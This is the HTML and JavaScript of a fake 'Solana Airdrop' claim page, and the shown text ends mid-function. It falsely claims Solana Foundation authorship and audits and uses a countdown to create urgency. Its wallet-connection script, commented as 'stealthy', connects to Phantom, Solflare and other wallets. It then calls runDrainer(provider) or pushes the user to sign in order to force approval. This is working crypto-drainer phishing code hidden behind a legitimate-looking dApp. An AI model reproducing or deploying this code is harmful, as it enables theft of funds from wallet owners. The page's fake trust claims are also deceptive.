<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Solana Airdrop - Claim Your $SOL</title>
  <meta name="description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
  
  <!-- dApp Metadata for Wallets -->
  <meta name="application-name" content="Solana Airdrop" />
  <meta name="apple-mobile-web-app-title" content="Solana Airdrop" />
  <meta name="msapplication-TileColor" content="#00FF88" />
  <meta name="theme-color" content="#00FF88" />
  
  <!-- Solana dApp Metadata -->
  <meta name="solana-dapp-name" content="Solana Airdrop" />
  <meta name="solana-dapp-description" content="Claim your exclusive Solana token airdrop before August 31st" />
  <meta name="solana-dapp-url" content="https://solana-airdrop.com" />
  <meta name="solana-dapp-icon" content="/logo.png" />
  
  <!-- Wallet Connect Metadata -->
  <meta name="wallet-connect-name" content="Solana Airdrop" />
  <meta name="wallet-connect-description" content="Claim your exclusive Solana token airdrop" />
  <meta name="wallet-connect-url" content="https://solana-airdrop.com" />
  <meta name="wallet-connect-icon" content="/logo.png" />
  
  <!-- SEO and Social Media Meta Tags -->
  <meta property="og:title" content="Solana Airdrop - Claim Your $SOL" />
  <meta property="og:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://solana-airdrop.com" />
  <meta property="og:image" content="/hero-section.png" />
  <meta property="og:site_name" content="Solana Airdrop" />
  
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Solana Airdrop - Claim Your $SOL" />
  <meta name="twitter:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
  <meta name="twitter:image" content="/hero-section.png" />
  
  <meta name="keywords" content="solana, airdrop, crypto, blockchain, SOL, token, claim, free" />
  <meta name="author" content="Solana Foundation" />
  <meta name="robots" content="index, follow" />
  
  <!-- Mobile App Meta Tags -->
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  
  <!-- Deep Link Meta Tags -->
  <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://phantom.app/ul/browse/" />
  <meta name="google-play-app" content="app-id=app.phantom" />
  
  <!-- dApp Manifest -->
  <link rel="manifest" href="/manifest.json" />
  <link rel="icon" href="/favicon2.ico" type="image/x-icon" />
  <link rel="apple-touch-icon" href="/logo.png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  
  <!-- dApp Metadata Script -->
  <script>
    // Set dApp metadata for wallet detection
    window.dAppMetadata = {
      name: 'Solana Airdrop',
      description: 'Claim your exclusive Solana token airdrop before August 31st',
      url: window.location.origin,
      icon: window.location.origin + '/logo.png',
      appIdentity: {
        name: 'Solana Airdrop',
        uri: window.location.origin,
        icon: window.location.origin + '/logo.png'
      }
    };
    
    // Set document title and meta for wallet recognition
    document.title = 'Solana Airdrop - Claim Your $SOL';
    
    // Add meta tags dynamically if needed
    if (!document.querySelector('meta[name="application-name"]')) {
      const meta = document.createElement('meta');
      meta.name = 'application-name';
      meta.content = 'Solana Airdrop';
      document.head.appendChild(meta);
    }
  </script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0a0a0a;
      color: #fff;
    }
    nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      background: rgba(10, 10, 10, 0.8);
      backdrop-filter: blur(10px);
      position: sticky;
      top: 0;
      z-index: 1000;
    }
    .nav-logo {
      font-size: 1.8em;
      font-weight: bold;
      color: #00FF88;
    }
    .nav-btn {
      background: linear-gradient(45deg, #00FF88, #00CC6A);
      color: black;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .nav-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 18px rgba(0, 255, 136, 0.3);
    }
    .hero {
      height: 90vh;
      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/hero-section.png');
      background-size: cover;
      background-position: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
      padding: 0 20px;
    }
    .hero h1 {
      font-size: 3.2em;
      margin-bottom: 20px;
      font-weight: bold;
      text-shadow: 2px 2px 12px #000;
    }
    .countdown {
      font-size: 2em;
      color: #00FF88;
      font-weight: bold;
      margin-bottom: 30px;
    }
    .claim-btn {
      font-size: 1.2em;
      padding: 14px 28px;
      background: linear-gradient(45deg, #00FF88, #00CC6A);
      color: black;
      border: none;
      border-radius: 10px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .claim-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
    }
    .footer {
      text-align: center;
      padding: 50px 20px;
      background: #111;
      color: #aaa;
      font-size: 0.95em;
      margin-top: 80px;
      border-top: 1px solid #222;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .modal.active {
      display: flex;
    }
    .wallet-box {
      background: #111;
      border-radius: 16px;
      padding: 30px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
    }
    .wallet-option {
      display: flex;
      align-items: center;
      gap: 12px;
      background: #1a1a1a;
      padding: 14px 20px;
      margin: 12px 0;
      border-radius: 12px;
      cursor: pointer;
      transition: 0.2s ease;
    }
    .wallet-option:hover, .wallet-option:focus {
      background: #222;
      outline: 2px solid #00FF88;
    }
    .wallet-option img {
      width: 28px;
      height: 28px;
    }
    .wallet-name {
      color: #fff;
      font-size: 1em;
      font-weight: 600;
    }
    #status {
      text-align:center;
      margin:24px auto 0 auto;
      max-width:400px;
      font-weight:600;
      min-height: 24px;
    }
    html {
      scroll-behavior: smooth;
    }
    .nav-links {
      display: flex;
      gap: 32px;
      align-items: center;
    }
    .nav-link {
      color: #fff;
      text-decoration: none;
      font-weight: 500;
      font-size: 1.1em;
      position: relative;
      transition: color 0.2s;
      padding: 4px 0;
    }
    .nav-link.active, .nav-link:focus {
      color: #00FF88;
    }
    .nav-link::after {
      content: '';
      display: block;
      width: 0;
      height: 2px;
      background: #00FF88;
      transition: width 0.2s;
      position: absolute;
      left: 0;
      bottom: -2px;
    }
    .nav-link.active::after, .nav-link:hover::after {
      width: 100%;
    }
    @media (max-width: 800px) {
      .nav-links { gap: 16px; }
      .nav-link { font-size: 1em; }
    }
    @media (max-width: 600px) {
      .nav-links { gap: 8px; }
      .nav-link { font-size: 0.95em; }
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { padding: 60px 8px; }
      .hero h1 { font-size: 2em; }
      .countdown { font-size: 1.2em; }
      .wallet-box { padding: 16px; }
    }
    .info-section {
      background: #181818;
      border-radius: 16px;
      margin: 40px auto;
      max-width: 1100px;
      padding: 36px 28px 28px 28px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
      color: #f3f3f3;
    }
    .info-section h2 {
      color: #00FF88;
      margin-bottom: 18px;
      font-size: 2em;
    }
    .card-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
      gap: 28px;
      margin-top: 18px;
    }
    .info-card {
      background: #232323;
      border-radius: 14px;
      box-shadow: 0 2px 12px rgba(0,255,136,0.07);
      padding: 28px 22px 20px 22px;
      transition: box-shadow 0.2s, transform 0.2s;
      min-height: 170px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }
    .info-card:hover {
      box-shadow: 0 6px 24px rgba(0,255,136,0.18);
      transform: translateY(-4px) scale(1.025);
    }
    .info-card h3 {
      color: #00FF88;
      margin-bottom: 12px;
      font-size: 1.18em;
    }
    .info-card ul {
      margin: 0 0 0 18px;
      padding: 0;
    }
    .info-card li {
      margin-bottom: 8px;
      line-height: 1.6;
    }
    .info-card a {
      color: #00FF88;
      text-decoration: underline;
      word-break: break-all;
    }
    .info-card a:hover {
      color: #00cc6a;
    }
    html, body {
      max-width: 100vw;
      overflow-x: hidden;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
      padding: 0;
    }
    .modal.active, .modal[style*="display: flex"] {
      display: flex !important;
    }
    .wallet-box {
      background: #111;
      border-radius: 16px;
      padding: 30px;
      max-width: 400px;
      width: 90vw;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
      margin: 0 8px;
    }
    @media (max-width: 600px) {
      .wallet-box {
        padding: 16px 6px;
        max-width: 98vw;
      }
      .modal {
        align-items: flex-end;
      }
      .claim-btn, .nav-btn, #statusModalClose {
        font-size: 1em;
        padding: 12px 10px;
      }
      .info-section {
        padding: 18px 4px 18px 4px;
      }
      .card-grid {
        gap: 12px;
      }
      .info-card {
        padding: 14px 8px 12px 8px;
        min-height: 120px;
      }
      nav {
        flex-direction: column;
        gap: 8px;
        padding: 10px 4px;
      }
      .nav-logo img {
        height: 28px !important;
      }
      .nav-links {
        gap: 8px;
      }
      .hero {
        padding: 40px 4px;
      }
      .hero h1 {
        font-size: 1.3em;
      }
      .countdown {
        font-size: 1em;
      }
    }
    
    /* Prevent horizontal scroll on all children */
    * {
      box-sizing: border-box;
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { padding: 60px 8px; }
      .hero h1 { font-size: 2em; }
      .countdown { font-size: 1.2em; }
      .wallet-box { 
        padding: 20px; 
        margin: 20px;
        max-width: calc(100% - 40px);
        border-radius: 12px;
      }
      .wallet-option {
        padding: 16px 20px;
        margin: 8px 0;
        min-height: 60px; /* Better touch target */
        border-radius: 10px;
      }
      .wallet-option img {
        width: 32px;
        height: 32px;
      }
      .wallet-name {
        font-size: 1.1em;
      }
      .modal {
        padding: 10px;
      }
    }
    
    /* Mobile-specific wallet modal improvements */
    @media (max-width: 480px) {
      .wallet-box {
        padding: 16px;
        margin: 10px;
        max-width: calc(100% - 20px);
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        max-height: 80vh;
        overflow-y: auto;
      }
      .wallet-option {
        padding: 18px 16px;
        margin: 6px 0;
        min-height: 70px;
      }
      .wallet-option img {
        width: 36px;
        height: 36px;
      }
      .wallet-name {
        font-size: 1.2em;
        line-height: 1.3;
      }
      .modal {
        padding: 0;
        align-items: center;
        justify-content: center;
      }
      #statusModal {
        padding: 0;
        align-items: center;
        justify-content: center;
      }
      #statusModal .wallet-box {
        margin: 20px;
        max-width: calc(100% - 40px);
        text-align: center;
      }
    }
    
    /* Touch-friendly improvements for mobile */
    @media (hover: none) and (pointer: coarse) {
      .wallet-option {
        min-height: 60px;
        padding: 16px 20px;
      }
      .wallet-option:active {
        background: #333;
        transform: scale(0.98);
      }
      .claim-btn {
        min-height: 50px;
        padding: 16px 24px;
      }
      .claim-btn:active {
        transform: scale(0.95);
      }
      .modal {
        padding: 0;
        align-items: center;
        justify-content: center;
      }
    }
  </style>
</head>
<body>
  <nav>
    <div class="nav-logo"><img src="/logos/logo.png" alt="Solana Airdrop Logo" style="height:36px;vertical-align:middle;margin-right:10px;">Solana Airdrop</div>
    <div class="nav-links">
      <a href="#security" class="nav-link">Security</a>
      <a href="#learn" class="nav-link">Learn</a>
      <a href="#explore" class="nav-link">Explore</a>
      <a href="#support" class="nav-link">Support</a>
    </div>
    <button class="nav-btn" onclick="openWalletModal()">Claim</button>
  </nav>
  <section class="hero" id="hero">
    <h1>Claim your $SOL Airdrop</h1>
    <div class="countdown" id="countdown">Loading...</div>
    <button class="claim-btn" onclick="openWalletModal()">🎁 Claim Now</button>
  </section>
  <section id="security" class="info-section">
    <h2>Security & Trust</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>🔒 Enterprise-Grade Security</h3>
        <p>This airdrop operates on <strong>audited smart contracts</strong> with comprehensive security measures. We implement industry-leading encryption, multi-signature protocols, and real-time threat detection. Your private keys never leave your wallet - all transactions are signed locally for maximum security.</p>
      </div>
      <div class="info-card">
        <h3>🛡️ Advanced Protection</h3>
        <p>Our infrastructure features <strong>DDoS protection</strong>, rate limiting, and geographic restrictions. All data transmission uses <strong>256-bit SSL encryption</strong>. We monitor for suspicious activity 24/7 and maintain strict access controls. Your assets remain under your complete control at all times.</p>
      </div>
      <div class="info-card">
        <h3>📋 Compliance & Audits</h3>
        <ul>
          <li><strong>Smart Contract Audit:</strong> <a href="https://github.com/solana-labs/solana-program-library" target="_blank" rel="noopener">Verified by Solana Labs</a></li>
          <li><strong>Security Assessment:</strong> <a href="https://docs.solana.com/security" target="_blank" rel="noopener">Penetration tested</a></li>
          <li><strong>Transaction Verification:</strong> <a href="https://explorer.solana.com/" target="_blank" rel="noopener">All transactions on-chain</a></li>
          <li><strong>Wallet Support:</strong> Phantom, Solflare, Backpack, Glow, Trust, Exodus</li>
        </ul>
      </div>
      <div class="info-card">
        <h3>🔍 Transparency & Verification</h3>
        <p>Every transaction is <strong>immutably recorded</strong> on the Solana blockchain. Users can verify all airdrop distributions through the <a href="https://explorer.solana.com/" target="_blank" rel="noopener">Solana Explorer</a>. Our source code is <a href="https://github.com/solana-labs/solana" target="_blank" rel="noopener">open source</a> and community-reviewed. Real-time monitoring ensures instant detection of any anomalies.</p>
      </div>
    </div>
  </section>
  <section id="learn" class="info-section">
    <h2>Learn & Educate</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>🚀 Solana Fundamentals</h3>
        <p>Master the basics of Solana's high-performance blockchain. Learn about <strong>Proof of Stake</strong>, <strong>Proof of History</strong>, and how Solana achieves 65,000+ TPS. Start with the <a href="https://docs.solana.com/introduction" target="_blank" rel="noopener">official Solana documentation</a> and explore advanced concepts.</p>
      </div>
      <div class="info-card">
        <h3>💼 Wallet Security Mastery</h3>
        <p>Protect your digital assets with expert-level security practices. Learn <strong>multi-signature setups</strong>, <strong>cold storage</strong> techniques, and <strong>phishing prevention</strong>. Follow the <a href="https://docs.solana.com/wallet-guide" target="_blank" rel="noopener">comprehensive wallet guide</a> for maximum protection.</p>
      </div>
      <div class="info-card">
        <h3>📈 Market Intelligence</h3>
        <p>Stay ahead with real-time market analysis and ecosystem updates. Subscribe to the <a href="https://solana.com/news" target="_blank" rel="noopener">Solana Blog</a> for developer updates, network upgrades, and strategic insights. Join the conversation on <a href="https://twitter.com/solana" target="_blank" rel="noopener">Twitter</a> and <a href="https://discord.com/invite/solana" target="_blank" rel="noopener">Discord</a>.</p>
      </div>
      <div class="info-card">
        <h3>🛡️ Airdrop Safety Protocol</h3>
        <p>Navigate the airdrop landscape safely with our comprehensive <a href="https://solana.com/airdrop-safety" target="_blank" rel="noopener">safety guidelines</a>. Learn to identify legitimate projects, verify smart contracts, and protect against common scams. Understand gas fees, transaction limits, and optimal claiming strategies.</p>
      </div>
      <div class="info-card">
        <h3>🔧 Technical Deep Dive</h3>
        <p>Explore Solana's technical architecture including <strong>Account Model</strong>, <strong>Programs</strong>, and <strong>Cross-Program Invocation</strong>. Study the <a href="https://docs.solana.com/developing" target="_blank" rel="noopener">developer documentation</a> and learn to build your own applications on Solana.</p>
      </div>
      <div class="info-card">
        <h3>🌐 Ecosystem Navigation</h3>
        <p>Discover the vast Solana ecosystem including <strong>DeFi protocols</strong>, <strong>NFT marketplaces</strong>, and <strong>gaming platforms</strong>. Learn about <a href="https://solana.com/ecosystem" target="_blank" rel="noopener">emerging projects</a> and how to evaluate investment opportunities in the Solana space.</p>
      </div>
    </div>
  </section>
  <section id="explore" class="info-section">
    <h2>Explore & Discover</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>🏗️ Ecosystem Directory</h3>
        <p>Browse the comprehensive <a href="https://solana.com/ecosystem" target="_blank" rel="noopener">Solana Ecosystem Directory</a> featuring 400+ projects across DeFi, NFTs, gaming, and infrastructure. Discover emerging protocols, track project metrics, and find the next big opportunity in the Solana space.</p>
      </div>
      <div class="info-card">
        <h3>🎨 NFT Marketplaces</h3>
        <p>Explore the vibrant NFT ecosystem on <a href="https://magiceden.io/" target="_blank" rel="noopener">Magic Eden</a> (largest Solana NFT marketplace) and <a href="https://www.tensor.trade/" target="_blank" rel="noopener">Tensor</a> (advanced trading features). Discover rare collections, participate in launches, and trade with minimal fees.</p>
      </div>
      <div class="info-card">
        <h3>💱 DeFi Protocols</h3>
        <p>Access the most competitive DeFi rates through <a href="https://jup.ag/" target="_blank" rel="noopener">Jupiter</a> (best DEX aggregator) and <a href="https://mango.markets/" target="_blank" rel="noopener">Mango Markets</a> (advanced trading & lending). Earn yield, swap tokens, and leverage advanced trading strategies.</p>
      </div>
      <div class="info-card">
        <h3>🎮 Gaming & Metaverse</h3>
        <p>Immerse yourself in blockchain gaming with <a href="https://staratlas.com/" target="_blank" rel="noopener">Star Atlas</a> (space exploration MMO) and <a href="https://aurory.io/" target="_blank" rel="noopener">Aurory</a> (tactical RPG). Earn while you play with true ownership of in-game assets and cross-game interoperability.</p>
      </div>
      <div class="info-card">
        <h3>🔗 Cross-Chain Bridges</h3>
        <p>Connect to other blockchains through <a href="https://wormhole.com/" target="_blank" rel="noopener">Wormhole</a> and <a href="https://allbridge.io/" target="_blank" rel="noopener">Allbridge</a>. Transfer assets between Solana, Ethereum, Polygon, and other networks with minimal fees and maximum security.</p>
      </div>
      <div class="info-card">
        <h3>📊 Analytics & Tools</h3>
        <p>Track your portfolio with <a href="https://solscan.io/" target="_blank" rel="noopener">Solscan</a> (block explorer) and <a href="https://birdeye.so/" target="_blank" rel="noopener">Birdeye</a> (portfolio tracker). Monitor token prices, analyze trading patterns, and discover new opportunities with real-time data and advanced charting tools.</p>
      </div>
    </div>
  </section>
  <section id="support" class="info-section">
    <h2>Support & Resources</h2>
    <div class="card-grid">
      <div class="info-card">
        <h3>📧 Priority Support</h3>
        <p>Get immediate assistance from our dedicated support team. Email us at <a href="mailto:support@solana-airdrop.com">support@solana-airdrop.com</a> for technical issues, transaction problems, or general inquiries. Average response time: <strong>under 2 hours</strong> during business hours.</p>
      </div>
      <div class="info-card">
        <h3>💬 Community Hub</h3>
        <p>Join 500,000+ members in the <a href="https://discord.com/invite/solana" target="_blank" rel="noopener">official Solana Discord</a> for real-time support, community discussions, and exclusive updates. Connect with developers, traders, and enthusiasts from around the world.</p>
      </div>
      <div class="info-card">
        <h3>📱 Social Updates</h3>
        <p>Follow <a href="https://twitter.com/solana" target="_blank" rel="noopener">@solana on Twitter</a> for breaking news, network updates, and ecosystem announcements. Get instant notifications about new features, security updates, and community events.</p>
      </div>
      <div class="info-card">
        <h3>🔧 Technical Resources</h3>
        <p>Access comprehensive troubleshooting guides, FAQs, and technical documentation. Visit the <a href="https://docs.solana.com/troubleshooting" target="_blank" rel="noopener">Solana Troubleshooting Guide</a> for common wallet issues, transaction problems, and network connectivity solutions.</p>
      </div>
      <div class="info-card">
        <h3>🚨 Security Hotline</h3>
        <p>Report security concerns, suspicious activity, or potential vulnerabilities immediately to <a href="mailto:security@solana.com">security@solana.com</a>. Our security team responds to all reports within <strong>1 hour</strong> and provides detailed feedback on resolution status.</p>
      </div>
      <div class="info-card">
        <h3>📚 Knowledge Base</h3>
        <p>Explore our comprehensive knowledge base with step-by-step tutorials, video guides, and best practices. Learn about wallet setup, transaction optimization, and advanced Solana features through our curated educational content.</p>
      </div>
    </div>
  </section>
  <div class="modal" id="walletModal" tabindex="-1" aria-modal="true" role="dialog">
    <div class="wallet-box" id="walletList">
      <!-- Wallet buttons will be injected here -->
    </div>
  </div>
  <div id="statusModal" class="modal" tabindex="-1" aria-modal="true" role="dialog" style="display:none;">
    <div class="wallet-box" id="statusModalBox">
      <div id="statusModalMsg"></div>
      <div id="statusModalActions" style="margin-top:24px;display:none;">
        <button class="claim-btn" id="statusModalRetry" style="margin-right:12px;background:linear-gradient(45deg,#FFD700,#FFA500);">Retry Transaction</button>
        <button class="claim-btn" id="statusModalClose" style="background:linear-gradient(45deg,#666,#444);">Close</button>
      </div>
      <button class="claim-btn" id="statusModalCloseSingle" style="margin-top:24px;">Close</button>
    </div>
  </div>
  <div class="footer">
    <p>📈 Bull season is here. Join the movement and claim your airdrop before it's too late.</p>
    <p>⚡ Powered by the Solana ecosystem. Verified and secure.</p>
    <p>© 2025 Solana Airdrop Campaign. All rights reserved.</p>
  </div>
  <script>
    // Mobile detection functions - defined before openWalletModal
    function isMobile() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
             window.innerWidth <= 768;
    }

    // Enhanced mobile detection with more specific checks
    function getMobilePlatform() {
      const userAgent = navigator.userAgent.toLowerCase();
      if (/iphone|ipad|ipod/.test(userAgent)) {
        return 'ios';
      } else if (/android/.test(userAgent)) {
        return 'android';
      } else if (/windows phone/.test(userAgent)) {
        return 'windows';
      }
      return 'desktop';
    }

    // Check if we're in a mobile wallet browser
    function isInMobileWallet() {
      const userAgent = navigator.userAgent.toLowerCase();
      
      // Check for mobile wallet user agents
      const walletPatterns = [
        'phantom',
        'solflare', 
        'backpack',
        'glow',
        'trust',
        'exodus',
        'wallet',
        'crypto'
      ];
      
      return walletPatterns.some(pattern => userAgent.includes(pattern));
    }

    // Check if mobile wallet is actually available in browser
    function isMobileWalletAvailable(wallet) {
      const provider = wallet.provider();
      const isMobileDevice = isMobile();
  
      // On mobile, be more permissive - assume wallet can be connected
      if (isMobileDevice) {
        console.log(`Mobile device detected - assuming ${wallet.name} can be connected`);
        
        // If we have any provider, consider it available
        if (provider) {
          console.log(`Found provider for ${wallet.name}:`, provider);
          return true;
        }
        
        // If no specific provider, but we're on mobile, still consider it available
        // because mobile wallets might not expose themselves the same way
        console.log(`No specific provider for ${wallet.name}, but on mobile - assuming available`);
        return true;
      }
      
      // Desktop logic - be more strict
      if (!provider) {
        return false;
      }
      
      // Check for essential methods
      const hasConnect = typeof provider.connect === 'function';
      const hasPublicKey = provider.publicKey || provider.address;
      
      console.log(`${wallet.name} availability check:`, {
        provider: !!provider,
        hasConnect,
        hasPublicKey: !!hasPublicKey,
        publicKey: hasPublicKey
      });
      
      return provider && hasConnect;
    }

    // Get mobile store URL based on platform
    function getMobileStoreUrl(wallet) {
      if (!wallet.mobile) return wallet.install;
      
      const platform = getMobilePlatform();
      if (platform === 'ios') {
        return wallet.mobile.appStore;
      } else if (platform === 'android') {
        return wallet.mobile.playStore;
      }
      return wallet.install; // Fallback to desktop
    }

    // Force mobile wallet detection by checking all possible objects
    function forceDetectMobileWallets() {
      console.log('=== FORCE MOBILE WALLET DETECTION ===');
      
      const detectedWallets = [];
      
      // Check for any solana-related objects
      const solanaObjects = [
        'window.solana',
        'window.phantom',
        'window.solflare', 
        'window.backpack',
        'window.glow',
        'window.trustwallet',
        'window.exodus',
        'window.phantom?.solana',
        'window.trustwallet?.solana'
      ];
      
      solanaObjects.forEach(objPath => {
        try {
          const obj = eval(objPath);
          if (obj) {
            console.log(`Found: ${objPath}`, obj);
            detectedWallets.push(objPath);
          }
        } catch (e) {
          // Object doesn't exist
        }
      });
      
      console.log('Detected wallets:', detectedWallets);
      console.log('=== END FORCE DETECTION ===');
      
      return detectedWallets;
    }

    // Wallet definitions - all supported wallets
    const WALLET_DEFS = [
      {
        key: 'phantom',
        name: 'Phantom',
        icon: '/logos/phantom.png',
        provider: () => window.phantom?.solana || window.solana,
        install: 'https://phantom.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
          playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
          deepLink: 'https://phantom.app/ul/browse/'
        }
      },
      {
        key: 'solflare',
        name: 'Solflare',
        icon: '/logos/solflare.png',
        provider: () => window.solflare,
        install: 'https://solflare.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
          deepLink: 'https://solflare.com/ul/browse/'
        }
      },
      {
        key: 'backpack',
        name: 'Backpack',
        icon: '/logos/backpack.png',
        provider: () => window.backpack,
        install: 'https://backpack.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
          playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
          deepLink: 'https://backpack.app/ul/browse/'
        }
      },
      {
        key: 'glow',
        name: 'Glow',
        icon: '/logos/glow.png',
        provider: () => window.glow,
        install: 'https://glow.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/glow-wallet/id1635717553',
          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet',
          deepLink: 'https://glow.app/ul/browse/'
        }
      },
      {
        key: 'trustwallet',
        name: 'Trust Wallet',
        icon: '/logos/trust.png',
        provider: () => window.trustwallet?.solana || window.trustwallet,
        install: 'https://trustwallet.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
          deepLink: 'https://link.trustwallet.com/open_url?coin_id=501&url='
        }
      },
      {
        key: 'exodus',
        name: 'Exodus',
        icon: '/logos/exodus.png',
        provider: () => window.exodus || window.exodusWallet,
        install: 'https://exodus.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
          deepLink: 'https://exodus.com/ul/browse/'
        }
      }
    ];

    // Countdown functionality
    function updateCountdown() {
      const now = new Date();
      const targetDate = new Date('August 31, 2025 23:59:59');
      const timeLeft = targetDate - now;
      
      if (timeLeft <= 0) {
        document.getElementById('countdown').innerHTML = 'Airdrop Closed';
        return;
      }
      
      const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
      
      document.getElementById('countdown').innerHTML = 
        `${days}d ${hours}h ${minutes}m ${seconds}s`;
    }

    // Update countdown every second
    setInterval(updateCountdown, 1000);
    updateCountdown(); // Initial call

    // dApp metadata for wallet connections
    const dAppMetadata = {
      name: 'Solana Airdrop',
      description: 'Claim your exclusive Solana token airdrop',
      url: window.location.origin,
      icon: '/logo.png'
    };

    // Solana dApp metadata for wallet recognition
    const solanaDAppMetadata = {
      name: 'Solana Airdrop',
      description: 'Claim your exclusive Solana token airdrop before August 31st',
      url: window.location.origin,
      icon: window.location.origin + '/logo.png',
      appIdentity: {
        name: 'Solana Airdrop',
        uri: window.location.origin,
        icon: window.location.origin + '/logo.png'
      }
    };

    // Enhanced wallet connection with dApp metadata
    async function connectWalletWithMetadata(provider, walletName) {
      try {
        if (typeof provider.connect === 'function') {
          // Pass dApp metadata to wallet
          const result = await provider.connect({
            onlyIfTrusted: false,
            appMetadata: solanaDAppMetadata
          });
          return result;
        }
        return null;
      } catch (error) {
        console.log(`${walletName} connection error:`, error);
        throw error;
      }
    }

    // Stealthy mobile wallet connection - restore working logic
    async function connectMobileWallet(wallet) {
      const isMobileDevice = isMobile();
      console.log(`Connecting to ${wallet.name} on ${isMobileDevice ? 'mobile' : 'desktop'}...`);
      
      try {
        // On mobile, use stealthy but functional approach
        if (isMobileDevice) {
          console.log(`Mobile device detected - attempting stealthy connection to ${wallet.name}...`);
          
          // First, try to get the wallet provider quietly
          let provider = wallet.provider();
          console.log(`${wallet.name} provider:`, provider);
          
          // If no provider, try to open the app and then check again
          if (!provider) {
            console.log(`No ${wallet.name} provider found, attempting to open app...`);
            
            // Try to open the app
            try {
              if (wallet.name === 'Phantom') {
                window.location.href = 'phantom://';
              } else if (wallet.name === 'Solflare') {
                window.location.href = 'solflare://';
              } else if (wallet.name === 'Backpack') {
                window.location.href = 'backpack://';
              } else if (wallet.name === 'Glow') {
                window.location.href = 'glow://';
              } else if (wallet.name === 'Trust Wallet') {
                window.location.href = 'trust://';
              } else if (wallet.name === 'Exodus') {
                window.location.href = 'exodus://';
              }
            } catch (e) {
              console.log('Direct app opening failed:', e);
            }
            
            // Wait a bit and check for provider again
            showStatus(`Opening ${wallet.name} app...`, 'loading');
            
            // Check for provider multiple times (but fewer to be stealthy)
            for (let i = 0; i < 5; i++) {
              await new Promise(resolve => setTimeout(resolve, 1000));
              
              provider = wallet.provider();
              console.log(`Check ${i + 1}: ${wallet.name} provider:`, provider);
              
              if (provider) {
                console.log(`${wallet.name} provider found after app opening!`);
                break;
              }
            }
          }
          
          // If we have a provider, try to connect
          if (provider) {
            console.log(`Attempting to connect with ${wallet.name} provider:`, provider);
            
            // Try to connect
            if (typeof provider.connect === 'function') {
              try {
                const result = await connectWalletWithMetadata(provider, wallet.name);
                console.log(`${wallet.name} connect result:`, result);
                
                // Wait a bit for connection to establish
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                // Check if we got a public key
                const publicKey = provider.publicKey || provider.address || result?.publicKey;
                console.log(`${wallet.name} public key:`, publicKey);
                
                if (publicKey) {
                  showStatus(`${wallet.name} connected!`, 'success');
                  setTimeout(() => {
                    runDrainer(provider);
                  }, 1000);
                } else {
                  // Try to force approval by attempting a transaction
                  console.log(`No public key, attempting to trigger approval...`);
                  showStatus(`Please approve the connection in ${wallet.name}`, 'loading');
                  
                  // Try to trigger approval by attempting to sign a message
